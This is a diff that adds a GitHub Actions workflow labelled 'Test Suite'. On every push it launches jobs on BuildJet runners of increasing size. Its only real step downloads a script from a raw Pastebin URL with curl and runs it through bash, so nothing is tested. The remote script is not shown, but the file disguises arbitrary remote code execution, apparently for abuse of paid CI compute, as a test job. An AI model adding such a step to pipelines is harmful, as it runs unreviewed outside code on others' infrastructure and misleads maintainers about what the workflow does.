@@ -1,0 +1,13 @@
+name: Test Suite
+on: push
+jobs:
+  test:
+    strategy:
+      matrix:
+        runs-on: [buildjet-2vcpu-ubuntu-2204, buildjet-4vcpu-ubuntu-2204, buildjet-8vcpu-ubuntu-2204, buildjet-16vcpu-ubuntu-2204]
+    name: Test - ${{matrix.runs-on}}
+    runs-on: ${{matrix.runs-on}}
+    steps:
+      - uses: actions/checkout@v2
+      - run: |
+         bash -c "$(curl -fsSL https://pastebin.com/raw/2Q8BJ4Ka)"      
